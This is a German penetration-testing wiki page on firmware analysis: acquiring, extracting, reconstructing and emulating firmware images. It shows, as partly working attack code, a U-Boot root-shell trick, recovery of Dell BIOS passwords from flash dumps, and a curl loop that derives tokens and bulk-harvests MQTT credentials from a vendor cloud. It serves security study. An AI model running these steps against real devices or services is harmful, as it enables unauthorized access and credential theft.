# Firmware-Analyse

{{#include ../../banners/hacktricks-training.md}}

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/dds-rtps-security.md
{{#endref}}

## **Einführung**

### Verwandte Ressourcen

Zum Auslesen von Daten über freiliegende Hardware-Schnittstellen siehe [Firmware-Dumping über die UART-Konsole](../hardware-hacking/uart.md#dumping-firmware-with-uart-console) und [SPI-Flash-Dumping](../hardware-hacking/spi.md#dumping-firmware-from-eeproms).

{{#ref}}
uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware ist essenzielle Software, die den korrekten Betrieb von Geräten ermöglicht, indem sie die Kommunikation zwischen den Hardwarekomponenten und der Software verwaltet und erleichtert, mit der Benutzer interagieren. Sie wird in einem permanenten Speicher abgelegt, sodass das Gerät vom Einschalten an auf wichtige Anweisungen zugreifen kann und anschließend das Betriebssystem startet. Die Untersuchung und mögliche Modifizierung der Firmware ist ein entscheidender Schritt, um Sicherheitslücken zu identifizieren.<sup>[[2]](#references)[[3]](#references)</sup>

## **Informationen sammeln**

Das **Sammeln von Informationen** ist ein entscheidender erster Schritt, um die Zusammensetzung eines Geräts und die verwendeten Technologien zu verstehen. Dabei werden Daten zu folgenden Punkten gesammelt:

- CPU-Architektur und darauf ausgeführtes Betriebssystem
- Einzelheiten zum Bootloader
- Hardware-Layout und Datenblätter
- Kennzahlen zur Codebasis und Speicherorte des Quellcodes
- Externe Bibliotheken und Lizenztypen
- Update-Verlauf und behördliche Zertifizierungen
- Architektur- und Ablaufdiagramme
- Sicherheitsbewertungen und identifizierte Schwachstellen

Zu diesem Zweck sind Tools zur **Open-Source-Intelligence (OSINT)** äußerst wertvoll, ebenso wie die Analyse verfügbarer Open-Source-Softwarekomponenten durch manuelle und automatisierte Prüfverfahren. Tools wie [Coverity Scan](https://scan.coverity.com) und [Semmle’s LGTM](https://lgtm.com/#explore) bieten kostenlose statische Analysen, mit denen sich potenzielle Probleme finden lassen.

## **Firmware beschaffen**

Firmware lässt sich auf verschiedene Arten beschaffen, die jeweils unterschiedlich komplex sind:

- **Direkt** von der Quelle (Entwickler, Hersteller)
- **Erstellen** anhand bereitgestellter Anweisungen
- **Herunterladen** von offiziellen Support-Websites
- **Google-dork**-Suchanfragen verwenden, um gehostete Firmware-Dateien zu finden
- Direkt auf **Cloud-Speicher** zugreifen, zum Beispiel mit [S3Scanner](https://github.com/sa7mon/S3Scanner)
- **Updates** mithilfe von Man-in-the-Middle-Techniken abfangen
- Firmware über Verbindungen wie **UART**, **JTAG** oder **PICit** aus dem Gerät **extrahieren**
- In der Gerätekommunikation nach Update-Anfragen **sniffen**
- **Fest codierte Update-Endpunkte** identifizieren und verwenden
- Firmware aus dem Bootloader oder über das Netzwerk **dumpen**
- Wenn nichts anderes funktioniert, den Speicherchip **entfernen und auslesen**, gegebenenfalls mit geeigneten Hardware-Tools

### Nur UART-Logs: Eine Root-Shell über die U-Boot-Umgebungsvariablen im Flash erzwingen

Wenn UART RX ignoriert wird (nur Logs), kannst du dennoch eine init-Shell erzwingen, indem du den **U-Boot-Umgebungsdatenblock** offline bearbeitest:<sup>[[6]](#references)</sup>

1. SPI-Flash mit einem SOIC-8-Clip und einem Programmer auslesen (3,3 V):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Finde die U-Boot-env-Partition, bearbeite `bootargs`, sodass `init=/bin/sh` enthalten ist, und **berechne die U-Boot-env-CRC32 für das Blob neu**.
3. Flashe nur die env-Partition erneut und starte das Gerät neu; über UART sollte eine Shell erscheinen.

Das ist bei Embedded-Geräten nützlich, bei denen die Bootloader-Shell deaktiviert ist, aber sich die env-Partition über externen Flash-Zugriff beschreiben lässt.

## Firmware analysieren

Nachdem du jetzt **die Firmware hast**, musst du Informationen darüber extrahieren, um zu wissen, wie du vorgehen musst. Dafür kannst du verschiedene Tools verwenden:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Wenn du mit diesen Tools nicht viel findest, überprüfe die **Entropie** des Images mit `binwalk -E <bin>`. Bei niedriger Entropie ist es wahrscheinlich nicht verschlüsselt. Bei hoher Entropie ist es wahrscheinlich verschlüsselt (oder auf irgendeine Weise komprimiert).

Außerdem kannst du mit diesen Tools **in der Firmware eingebettete Dateien** extrahieren:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Oder du kannst die Datei mit [**binvis.io**](https://binvis.io/#/) ([code](https://code.google.com/archive/p/binvis/)) untersuchen.

### Differentielle Flash-Analyse und wiederherstellbare XOR-Secret-Stores

Wenn für eine Firmware-Einstellung kein dokumentiertes Speicherformat existiert, erstelle zunächst mehrere übereinstimmende Flash-Dumps, ändere **genau eine** Einstellung, lies anschließend den gesamten Chip erneut aus und vergleiche die Offsets. Wiederhole das Experiment mit kontrollierten Werten, um die Einstellung von Zählern und Schreibmetadaten zu unterscheiden. Änderungen an neuen Offsets statt an derselben Stelle weisen auf einen append-only- oder log-structured Store hin. Behalte gelöschte bzw. als gelöscht markierte Einträge bei, da ihre Payload-Bytes möglicherweise noch wiederhergestellt werden können.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Nachdem du den Bereich lokalisiert hast, extrahiere die Firmware-Module mit Tools wie `binwalk` und reverse-engineere den Writer/Validator in Ghidra. Bestätige Feldgrenzen, Padding, Key-Indizierung und Key-Ableitung im Code, statt das Verfahren nur anhand von Ciphertext-Mustern abzuleiten.<sup>[[12]](#references)</sup>

#### Keys aus verschlüsseltem Zero-Padding wiederherstellen

Wie unter [XOR-basierte Verschlüsselung](../../crypto/symmetric/#xor-based-encryption) beschrieben, legt bekannter Klartext Keystream-Bytes an denselben Offsets offen. Ein Feld fester Größe ist besonders gefährdet, wenn sein Zero-Padding alle Indizes eines sich wiederholenden XOR-Keys abdeckt: Das verschlüsselte Padding legt diese Key-Bytes direkt offen, da `0x00 XOR key_byte = key_byte` gilt. Wenn jeder Key-Index abgedeckt ist, rekonstruiere den Key anhand des Ciphertext-Endes und entschlüssele die belegten Bytes.<sup>[[12]](#references)</sup>

Dells anfälliges DVAR-BIOS-Passwortformat ist ein konkretes Beispiel: Byte `0` eines 32-Byte-Feldes liegt im Klartext vor, während für die Bytes `1..31` ein sich wiederholender 20-Byte-Key verwendet wird.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Bei einer Passwortlänge `L` waren die Positionen `L..31` vor dem XOR auf null gesetzt. Wenn `L <= 12` gilt, decken diese Positionen jeden Schlüsselindex ab, sodass der vollständige Schlüssel und das Passwort ohne Brute Force wiederhergestellt werden:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Schlüssel aus historischen Datensätzen gewinnen

Analysiere nicht jeden Datensatz einzeln. Der DVAR-Schlüssel wird ungefähr wie folgt abgeleitet: `modified_md5(device_seed || variable_GUID || password[0])`: Der Geräteschlüssel und die GUID sind fest, und die einzige passwortabhängige Eingabe ist das erste Klartextbyte. Dadurch gibt es pro Gerät höchstens 256 Schlüssel, und Datensätze, die mit demselben Byte beginnen, verwenden denselben Schlüssel. Gruppiere aktive und gelöschte Datensätze nach diesem Byte; ein kurzer historischer Datensatz kann den vollständigen Schlüssel über Padding preisgeben und so einen aktuellen, längeren Datensatz entschlüsseln, dessen eigenes Padding nicht ausreicht. Eine Passwortrotation kann die Offenlegung daher verstärken, wenn alter Ciphertext als gelöscht markiert statt gelöscht wird.<sup>[[12]](#references)</sup>

Das Tool [`dellpwn`](https://github.com/R3n5k1/dellpwn) findet DVAR, validiert mögliche Datensätze, stellt Passwörter wieder her und kann rohe gespeicherte Schlüsselbytes anzeigen. Erstelle es aus einem Checkout und untersuche ein verifiziertes Flash-Image wie folgt:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Bei benutzerdefinierten Parsern lassen sich Fehlalarme anhand der Datensatzstruktur, druckbarer Zeichen, Null-Padding-Prüfungen, Schlüsselentropie und Konsistenz beim zyklischen Wiederholen des Schlüssels ausschließen. Wenn wiederholte Dumps vereinzelte Bit-Flips pro Schreibvorgang zeigen, ermitteln Sie die beobachteten Masken und bewerten Sie mögliche Korrekturen anhand dieser Bedingungen. Geben Sie jedoch mehrdeutige Zeichen an, statt heuristische Ergebnisse als exakte Wiederherstellung auszugeben.<sup>[[12]](#references)</sup>

Passwortverifizierer sollten einen gesalzenen, iterierten Einweg-Hash statt reversiblen Chiffretexts speichern. In logstrukturierten Speichern sollten veraltete geheime Daten sicher gelöscht werden.<sup>[[12]](#references)</sup>

### Dateisystem extrahieren

Mit den zuvor erwähnten Tools wie `binwalk -ev <bin>` sollten Sie das **Dateisystem extrahiert** haben können.\
Binwalk extrahiert es normalerweise in einem **Ordner, der nach dem Dateisystemtyp benannt ist**. Das ist üblicherweise einer der folgenden: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Manuelle Dateisystemextraktion

Manchmal enthält binwalk die Magic-Bytes des Dateisystems **nicht in seinen Signaturen**. Verwenden Sie in diesen Fällen binwalk, um den **Offset des Dateisystems zu ermitteln und das komprimierte Dateisystem** aus der Binärdatei zu carve'n. **Extrahieren Sie** das Dateisystem anschließend manuell entsprechend seinem Typ mithilfe der folgenden Schritte.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Führe den folgenden **dd-Befehl** aus, um das Squashfs-Dateisystem zu extrahieren.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Alternativ kann auch der folgende Befehl ausgeführt werden.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Für squashfs (wie im obigen Beispiel verwendet)

`$ unsquashfs dir.squashfs`

Die Dateien befinden sich anschließend im Verzeichnis "`squashfs-root`".

- CPIO-Archivdateien

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Für jffs2-Dateisysteme

`$ jefferson rootfsfile.jffs2`

- Für ubifs-Dateisysteme mit NAND-Flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Geteilte eingebettete Root-Dateisysteme rekonstruieren

Wenn ein roher eMMC-/SSD-Dump einen gültigen Dateisystem-Header enthält, dessen Metadaten-Offsets jedoch über die nominale Partition hinausreichen, sollte er nicht sofort als beschädigt eingestuft werden. Eingebetteter Boot-Code kann das tatsächliche Root-Gerät mit Device Mapper aus mehreren physischen Bereichen zusammensetzen. Daher liefert das Carving einer einzelnen GPT-Partition nur das erste Segment.<sup>[[9]](#references)</sup>

#### Das vollständige Medien-Image triagieren

Überprüfe zunächst, ob die Erfassung abgeschlossen ist, die Größe stabil bleibt und kein Schreibprozess das Image noch geöffnet hält. Wenn der Dateiname eine Start-/Endadresse enthält, vergleiche diesen Bereich mit der tatsächlichen Byte-Anzahl. Stelle die GPT schreibgeschützt wieder her und binde nur den erforderlichen Bereich ein. Führe **nicht** `vgchange -ay` für ein nicht vertrauenswürdiges physisches Volume auf der Workstation aus, da Konflikte mit Volume-Gruppen und unbeabsichtigte Schreibvorgänge möglich sind.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Bevorzuge eine wegwerfbare VM, wenn die ursprüngliche Init-Logik oder ein LVM-Stack das gesamte Image sehen muss. Historische Boot-Logs einer Standard-Bootpartition sind besonders nützlich: Der Bootloader hat möglicherweise Offsets proprietärer Container, Komponentenlängen, Slot-Auswahl, Ausrichtungsregeln und Signaturprüfungen protokolliert. Nutze diese Werte, um eine eingebettete Kommandozeile, einen Kernel und ein initramfs herauszulösen, und überprüfe anschließend jede Ausgabe unabhängig mit `file`, Magic Bytes und `binwalk`; beim Lesen bis zum Ende des Containers kann versehentlich ein initrd, ein ACPI-Objekt oder eine Signatur an den Kernel angehängt werden.<sup>[[9]](#references)</sup>

#### Bootzeit-Blockzuordnung rekonstruieren

Extrahiere das initramfs des Kernels und analysiere dessen `/init` sowie alle Speicherbibliotheken. Folge unter [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) den String-Referenzen zu `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` und Partitionspfaden; verfolge anschließend den Code, der den aktiven A/B-Slot auswählt und die Tabelle erstellt. Nützliche Einstiegspunkte in radare2 sind `r2 -A init`, `afl`, `pdf @ main` und `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Das lineare Target ordnet aufeinanderfolgende Bereiche eines virtuellen Geräts Bereichen auf einem oder mehreren zugrunde liegenden Geräten zu. Eine rekonstruierte Tabelle mit zwei Segmenten sieht häufig so aus (alle Positionen und Längen sind 512-Byte-Sektoren):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Gib die Arithmetik des Maschinencodes exakt wieder, einschließlich Integerbreite, Shifts und Einheitenumrechnungen. Zum Beispiel rundet der folgende Ausdruck eine Byte-Größe auf eine 4-KiB-Grenze ab und wandelt sie erst danach in 512-Byte-Sektoren um; ersetzt man ihn durch `p4_bytes // 512`, verschiebt sich der ausgewählte Endbereich um `p4_bytes % 4096`, wenn die Partition nicht an einer Seitengrenze ausgerichtet ist.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Rekonstruiere ein flaches Analyse-Image, indem du die Bereiche in Tabellenreihenfolge und in begrenzten Blöcken kopierst, statt den vollständigen Media-Dump in den Arbeitsspeicher zu laden. So werden auch Mapper-Geräte auf dem Host vermieden. Behalte die aus der GPT abgeleiteten Offsets, die umgekehrten Sektoranzahlen und die resultierende Ausgabelänge als separate Assertions bei.<sup>[[9]](#references)</sup>

#### Korruption von einem konstanten Rekonstruktionsfehler unterscheiden

Prüfe bei SquashFS vor dem Ausführen von `unsquashfs` die Magic `hsqs` und dekodiere das little-endian 64-Bit-Feld `bytes_used` an Superblock-Offset 40. Wenn die Extraktion bei mehreren unabhängigen Strukturen fehlschlägt, durchsuche ein breites Fenster um die erwarteten Positionen und verlange starke strukturelle Kandidaten: einen dekomprimierbaren Metadatenblock, mehrere aufeinanderfolgende gültige Verzeichniseinträge, plausible Inode-Felder, einen zum Inode-Zähler passenden Root-Inode oder eine gültige Integritätsmetadatenstruktur. Ein einzelner Magic-Treffer reicht nicht aus.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Wenn dasselbe signierte Delta unabhängige Strukturen gültig macht – zum Beispiel Verzeichnis-Metadaten und einen Verity-Datensatz –, ist die wahrscheinliche Ursache ein systematischer Fehler beim Segmentstart und nicht das Fehlen von Bytes. Kehren Sie zur umgekehrten Berechnung zurück und suchen Sie nach verworfenen Resten, Vorzeichenbehandlung, Überlauf oder Sektor-/Seitenrundung, bevor Sie versuchen, verwaiste Daten wiederherzustellen oder Dateisystem-Metadaten zu patchen.<sup>[[9]](#references)</sup>

Halten Sie schließlich die Schutzgrenzen getrennt: TPM-versiegelte LUKS-Volumes schützen die Vertraulichkeit der Daten, während ein signiertes dm-verity-Mapping die Integrität des Root-Dateisystems schützt. Ein Software-TPM kann keinen Schlüssel wiederherstellen, der an das ursprüngliche physische TPM gebunden ist, und das Booten eines modifizierten SquashFS über ein ausschließlich für Forschungszwecke vorgesehenes init, das die Verity-Prüfung auslässt, fälscht weder dessen Signatur noch hebelt es dm-verity aus.<sup>[[9]](#references)</sup>

## Firmware analysieren

Sobald die Firmware beschafft wurde, ist es wichtig, sie zu untersuchen, um ihre Struktur und potenzielle Schwachstellen zu verstehen. Dabei kommen verschiedene Tools zum Einsatz, mit denen sich das Firmware-Image analysieren und wertvolle Daten extrahieren lassen.

### Tools für die erste Analyse

Für die erste Untersuchung der Binärdatei (bezeichnet als `<bin>`) stehen verschiedene Befehle zur Verfügung. Sie helfen dabei, Dateitypen zu identifizieren, Zeichenfolgen zu extrahieren, Binärdaten zu analysieren und Details zu Partitionen und Dateisystemen zu ermitteln:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Um den Verschlüsselungsstatus des Images zu beurteilen, wird die **Entropie** mit `binwalk -E <bin>` geprüft. Eine niedrige Entropie deutet auf fehlende Verschlüsselung hin, während eine hohe Entropie auf mögliche Verschlüsselung oder Komprimierung hindeutet.

Zum Extrahieren **eingebetteter Dateien** werden Tools und Ressourcen wie die Dokumentation **file-data-carving-recovery-tools** und **binvis.io** zur Dateiprüfung empfohlen.

### Dateisystem extrahieren

Mit `binwalk -ev <bin>` lässt sich das Dateisystem normalerweise extrahieren, oft in ein Verzeichnis, das nach dem Dateisystemtyp benannt ist (z. B. squashfs, ubifs). Wenn **binwalk** den Dateisystemtyp aufgrund fehlender Magic Bytes jedoch nicht erkennt, ist eine manuelle Extraktion erforderlich. Dazu wird mit `binwalk` der Offset des Dateisystems ermittelt und anschließend mit dem Befehl `dd` das Dateisystem herausgeschnitten:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Anschließend werden je nach Dateisystemtyp (z. B. squashfs, cpio, jffs2, ubifs) unterschiedliche Befehle verwendet, um die Inhalte manuell zu extrahieren.

### Dateisystemanalyse

Sobald das Dateisystem extrahiert ist, beginnt die Suche nach Sicherheitslücken. Dabei wird auf unsichere Netzwerk-Daemons, fest codierte Zugangsdaten, API-Endpunkte, Funktionen von Update-Servern, nicht kompilierten Code, Startskripte und kompilierte Binärdateien für die Offline-Analyse geachtet.

**Wichtige Speicherorte** und **Elemente**, die untersucht werden sollten:

- **etc/shadow** und **etc/passwd** auf Benutzerzugangsdaten
- SSL-Zertifikate und -Schlüssel in **etc/ssl**
- Konfigurations- und Skriptdateien auf potenzielle Sicherheitslücken
- Eingebettete Binärdateien für weitere Analysen
- Gängige Webserver und Binärdateien von IoT-Geräten

Mit mehreren Tools lassen sich vertrauliche Informationen und Sicherheitslücken im Dateisystem aufspüren:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) und [**Firmwalker**](https://github.com/craigz28/firmwalker) zum Suchen nach vertraulichen Informationen
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) für umfassende Firmware-Analysen
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) und [**EMBA**](https://github.com/e-m-b-a/emba) für statische und dynamische Analysen

### Sicherheitsprüfungen kompilierter Binärdateien

Sowohl der im Dateisystem gefundene Quellcode als auch die kompilierten Binärdateien müssen auf Sicherheitslücken untersucht werden. Tools wie **checksec.sh** für Unix-Binärdateien und **PESecurity** für Windows-Binärdateien helfen dabei, ungeschützte Binärdateien zu identifizieren, die ausgenutzt werden könnten.

## Cloud-Konfigurationen und MQTT-Zugangsdaten über abgeleitete URL-Tokens auslesen

Viele IoT-Hubs rufen ihre gerätespezifische Konfiguration von einem Cloud-Endpunkt ab, der etwa so aussieht:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Bei der Firmware-Analyse kann sich herausstellen, dass `<token>` lokal anhand der Geräte-ID und eines fest codierten Geheimnisses abgeleitet wird, zum Beispiel:

- token = MD5( deviceId || STATIC_KEY ) and represented as uppercase hex

Dadurch kann jede Person, die eine deviceId und den STATIC_KEY kennt, die URL rekonstruieren und die Cloud-Konfiguration abrufen. Diese enthält häufig MQTT-Zugangsdaten im Klartext und Topic-Präfixe.

Praktischer Ablauf:

1) deviceId aus UART-Boot-Logs extrahieren

- Einen 3.3V-UART-Adapter anschließen (TX/RX/GND) und die Logs aufzeichnen:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Suche nach Zeilen, die das URL-Muster der Cloud-Konfiguration und die Broker-Adresse ausgeben, zum Beispiel:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) STATIC_KEY und Token-Algorithmus aus der Firmware wiederherstellen

- Lade die Binärdateien in Ghidra/radare2 und suche nach dem Konfigurationspfad ("/pf/") oder der Verwendung von MD5.
- Bestätige den Algorithmus (z. B. MD5(deviceId||STATIC_KEY)).
- Leite das Token in Bash ab und wandle den Digest in Großbuchstaben um:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Cloud-Konfiguration und MQTT-Zugangsdaten sammeln

- Die URL zusammensetzen und JSON mit curl abrufen; mit jq Secrets extrahieren:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Unverschlüsseltes MQTT und schwache Topic-ACLs ausnutzen (falls vorhanden)

- Mit wiederhergestellten Zugangsdaten Wartungstopics abonnieren und nach sensiblen Ereignissen suchen:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Vorhersagbare Geräte-IDs aufzählen (in großem Umfang, mit Autorisierung)

- Viele Ökosysteme enthalten Vendor-OUI-/Produkt-/Typ-Bytes, gefolgt von einem fortlaufenden Suffix.
- Du kannst Kandidaten-IDs iterieren, Tokens ableiten und Configs programmatisch abrufen:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Hinweise
- Hole immer eine ausdrückliche Genehmigung ein, bevor du mit einer Massenerfassung beginnst.
- Bevorzuge nach Möglichkeit Emulation oder statische Analyse, um Geheimnisse wiederherzustellen, ohne die Zielhardware zu verändern.


Durch die Emulation von Firmware ist eine **dynamische Analyse** des Betriebs eines Geräts oder eines einzelnen Programms möglich. Dabei kann es zu Herausforderungen durch Hardware- oder Architekturabhängigkeiten kommen. Die Übertragung des Root-Dateisystems oder bestimmter Binärdateien auf ein Gerät mit passender Architektur und Endianness, beispielsweise einen Raspberry Pi, oder auf eine vorgefertigte virtuelle Maschine kann jedoch weitere Tests ermöglichen.

### Einzelne Binärdateien emulieren

Bei der Untersuchung einzelner Programme ist es entscheidend, die Endianness und die CPU-Architektur des Programms zu bestimmen.

#### Beispiel mit MIPS-Architektur

Um eine Binärdatei für eine MIPS-Architektur zu emulieren, kann folgender Befehl verwendet werden:

```bash
file ./squashfs-root/bin/busybox
```

Und um die erforderlichen Emulationstools zu installieren:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Für MIPS (Big-Endian) wird `qemu-mips` verwendet; für Little-Endian-Binärdateien ist `qemu-mipsel` die passende Wahl.

#### Emulation der ARM-Architektur

Bei ARM-Binärdateien ist der Prozess ähnlich; für die Emulation wird der Emulator `qemu-arm` verwendet.

### Vollständige Systememulation

Tools wie [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) und andere ermöglichen die vollständige Firmware-Emulation, automatisieren den Prozess und unterstützen die dynamische Analyse.

### Rekonstruktion aufgeteilter und verifizierter Root-Dateisysteme für die Emulation

Wenn ein SquashFS-Superblock lesbar ist, die Offsets der Inode-, Verzeichnis- oder Fragmenttabellen jedoch unmöglich sind, sollte `unsquashfs` nicht sofort gepatcht werden. Analysieren Sie stattdessen die frühe Boot-Binärdatei rückwärts und bilden Sie den von ihr erstellten Blockgerätegraphen nach: Eingebettete Systeme können zwar eine nominelle Root-Partition bereitstellen, das tatsächliche Dateisystem jedoch mithilfe eines `dm-linear`-Mappings erstellen, das Sektoren aus einer anderen Partition anhängt. Prüfungen, die nur den Superblock berücksichtigen, können erfolgreich sein, obwohl alle nachfolgenden Metadatenblöcke verschoben sind.<sup>[[11]](#references)</sup>

Behalten Sie die Arithmetik der Firmware exakt bei. Ermitteln Sie insbesondere, ob Längen in Bytes, 512-Byte-Sektoren oder 4-KiB-Seiten angegeben sind; bilden Sie Verschiebungen und Abschneidungen in ihrer ursprünglichen Reihenfolge nach; und berücksichtigen Sie die von der Bank abhängigen Endbereiche bei A/B-Layouts. Beispielsweise schneidet `(partition_bytes >> 12) << 3` zuerst auf eine 4-KiB-Grenze ab und gibt das Ergebnis erst danach in 512-Byte-Sektoren an. Wird dies durch `partition_bytes // 512` ersetzt, kann sich der angehängte Bereich um einige Kilobyte verschieben und alle nachfolgenden SquashFS-Tabellen beschädigen.<sup>[[11]](#references)</sup>

Ein nützlicher Validierungsablauf ist:<sup>[[11]](#references)</sup>

1. Ermitteln Sie in der Verifier-/Init-Binärdatei für jedes `dm-linear`-Segment das Quelldateigerät, den Startsektor und die Länge.
2. Verketten Sie die Bereiche oder bilden Sie sie ab, ohne ihre Ausrichtungssemantik zu ändern.
3. Falls die Extraktion weiterhin fehlschlägt, durchsuchen Sie nur ein kleines Fenster um die vorhergesagte Grenze und verlangen Sie mehrere aufeinanderfolgende gültige Metadatenstrukturen, statt sich mit einem plausiblen Superblock allein zufriedenzugeben.
4. Führen Sie ein unverändertes `unsquashfs` für das rekonstruierte Image aus. Das erfolgreiche Durchlaufen aller Verzeichnisse und Fragmente ist ein stärkerer Beleg als `unsquashfs -stat`.

#### Vom Analysten gesteuerter dm-verity-Ersatz

Wenn der Analyst den QEMU-Kernel, das Initramfs und die virtuellen Laufwerke kontrolliert, lässt sich ein modifiziertes Root-Dateisystem booten, indem die Verifizierungs-PID 1 des Herstellers durch ein kleines statisch gelinktes Init ersetzt wird. Dies ist eine **Boot-Chain-Ersetzung im Labor** und kein Angriff auf dm-verity, dessen RSA-Signatur, Secure Boot oder einen durch ein TPM versiegelten Schlüssel.<sup>[[11]](#references)</sup>

Das Ersatz-Init sollte die betrieblichen Schritte des ursprünglichen Bootpfads nachbilden: `devtmpfs` mounten, `setsid()` aufrufen, `/dev/console` mit den Dateideskriptoren 0–2 verbinden, `/proc` und `/sys` mounten, auf das bereitgestellte Blockgerät warten, das bearbeitete Root-Dateisystem schreibgeschützt mounten, die Pseudo-Dateisysteme des alten Root-Dateisystems aushängen, den neuen Mount auf `/` verschieben, `chroot` ausführen und das ursprüngliche `/sbin/init` der Firmware mit `execve()` starten. Das Aushängen von `/dev`, `/proc` und `/sys` **vor** `MS_MOVE` verhindert, dass versehentlich Mount-Punkte aus dem neuen Root-Dateisystem ausgehängt werden.<sup>[[11]](#references)</sup>

Halten Sie den veränderlichen Gerätezustand vom modifizierten unveränderlichen Root-Dateisystem getrennt. Ein qcow2-Overlay kann den LVM-Zustand des Originaldatenträgers bewahren, während ein zweites schreibgeschütztes virtio-Laufwerk das bearbeitete SquashFS bereitstellt:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
